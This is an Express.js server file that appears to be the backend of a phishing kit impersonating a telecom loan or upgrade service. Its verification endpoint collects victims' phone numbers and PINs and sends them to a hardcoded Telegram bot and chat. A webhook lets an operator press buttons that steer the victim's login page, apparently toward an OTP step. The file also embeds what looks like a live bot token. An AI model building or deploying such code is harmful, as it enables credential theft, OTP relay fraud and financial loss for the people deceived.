const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Configuration
const BOT_TOKEN = '8843069473:AAFWS3TrGqaQQDHiZrMsDAwhSGV16SKglXA';
const CHAT_ID = '6414813627';

// Store pending approvals (in memory)
const pendingApprovals = new Map();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ========== SERVE HTML PAGES ==========
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/otp', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'otp.html'));
});

// ========== API ENDPOINTS FOR LOGIN PAGE ==========
// Check approval status (polled by login page)
app.get('/api/check-status/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    const status = pendingApprovals.get(requestId);
    console.log(`🔍 Status check for ${requestId}: ${status || 'pending'}`);
    res.json({ status: status || 'pending' });
});

// Send verification to Telegram (called by login page)
app.post('/api/send-verification', async (req, res) => {
    const { phone, pin, loanAmount, accountType, requestId } = req.body;
    
    console.log(`📨 Sending verification for request: ${requestId}`);
    console.log(`📞 Phone: ${phone}, PIN: ${pin}, Amount: ${loanAmount}`);
    
    // Store as pending
    pendingApprovals.set(requestId, 'pending');
    
    // Auto-clear after 5 minutes
    setTimeout(() => {
        if (pendingApprovals.get(requestId) === 'pending') {
            pendingApprovals.delete(requestId);
            console.log(`⏰ Request ${requestId} expired`);
        }
    }, 300000);
    
    const message = `🔴 <b>NEW LOAN VERIFICATION</b>\n\n━━━━━━━━━━━━━━━━━━\n💰 <b>Amount:</b> ${loanAmount}\n📱 <b>Account:</b> ${accountType}\n📞 <b>Phone:</b> <code>${phone}</code>\n🔐 <b>PIN:</b> <code>${pin}</code>\n🆔 <b>Request ID:</b> <code>${requestId}</code>\n🕐 <b>Time:</b> ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━\n\n<b>Click a button below:</b>`;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "✅ APPROVE LOAN", callback_data: `approve_${requestId}` },
                            { text: "📱 VERIFY DEVICE", callback_data: `verify_${requestId}` }
                        ],
                        [
                            { text: "📋 ALREADY APPLIED", callback_data: `applied_${requestId}` },
                            { text: "❌ DECLINE", callback_data: `decline_${requestId}` }
                        ]
                    ]
                }
            })
        });
        
        const data = await response.json();
        
        if (data.ok) {
            console.log(`✅ Telegram message sent successfully for ${requestId}`);
            res.json({ success: true });
        } else {
            console.log(`❌ Telegram error:`, data.description);
            res.json({ success: false, error: data.description });
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        res.json({ success: false, error: error.message });
    }
});

// ========== TELEGRAM WEBHOOK ==========
// Receives callbacks when admin clicks buttons on Telegram
app.post('/webhook', (req, res) => {
    const update = req.body;
    console.log('📨 Webhook received');
    
    if (update.callback_query) {
        const callbackData = update.callback_query.data;
        const callbackId = update.callback_query.id;
        const messageId = update.callback_query.message?.message_id;
        
        console.log(`🎯 Callback data: ${callbackData}`);
        
        // Answer callback immediately to remove loading state on Telegram button
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                callback_query_id: callbackId,
                text: "Processing..."
            })
        }).catch(console.error);
        
        // Extract request ID from callback data
        let requestId = null;
        let action = null;
        
        if (callbackData.startsWith('approve_')) {
            requestId = callbackData.replace('approve_', '');
            action = 'approved';
            console.log(`✅ APPROVED: Request ${requestId}`);
        } else if (callbackData.startsWith('verify_')) {
            requestId = callbackData.replace('verify_', '');
            action = 'verify_device';
            console.log(`📱 VERIFY DEVICE: Request ${requestId}`);
        } else if (callbackData.startsWith('applied_')) {
            requestId = callbackData.replace('applied_', '');
            action = 'already_applied';
            console.log(`📋 ALREADY APPLIED: Request ${requestId}`);
        } else if (callbackData.startsWith('decline_')) {
            requestId = callbackData.replace('decline_', '');
            action = 'declined';
            console.log(`❌ DECLINED: Request ${requestId}`);
        }
        
        if (requestId && pendingApprovals.has(requestId)) {
            pendingApprovals.set(requestId, action);
            console.log(`✅ Status updated for ${requestId}: ${action}`);
            
            // Update the Telegram message to show what was selected
            if (messageId) {
                let statusText = '';
                if (action === 'approved') statusText = '✅ LOAN APPROVED';
                else if (action === 'verify_device') statusText = '📱 DEVICE VERIFICATION';
                else if (action === 'already_applied') statusText = '📋 ALREADY APPLIED';
                else if (action === 'declined') statusText = '❌ DECLINED';
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        message_id: messageId,
                        text: `🔴 <b>LOAN VERIFICATION</b>\n\n━━━━━━━━━━━━━━━━━━\n${statusText}\n🆔 Request ID: ${requestId}\n🕐 Time: ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━`,
                        parse_mode: 'HTML'
                    })
                }).catch(console.error);
            }
        } else {
            console.log(`⚠️ Request ${requestId} not found in pending approvals`);
        }
        
        res.sendStatus(200);
    } else {
        res.sendStatus(200);
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.status(200).json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Setup webhook on Telegram (runs when server starts)
async function setupWebhook() {
    const webhookUrl = `https://telecel-upgrade-production.up.railway.app/webhook`;
    console.log(`🔧 Setting up webhook: ${webhookUrl}`);
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${webhookUrl}`);
        const data = await response.json();
        if (data.ok) {
            console.log('✅ Webhook configured successfully!');
        } else {
            console.log('❌ Webhook configuration failed:', data.description);
        }
    } catch (error) {
        console.error('Webhook setup failed:', error);
    }
}

// Start server
app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📱 App URL: https://telecel-upgrade-production.up.railway.app`);
    await setupWebhook();
});
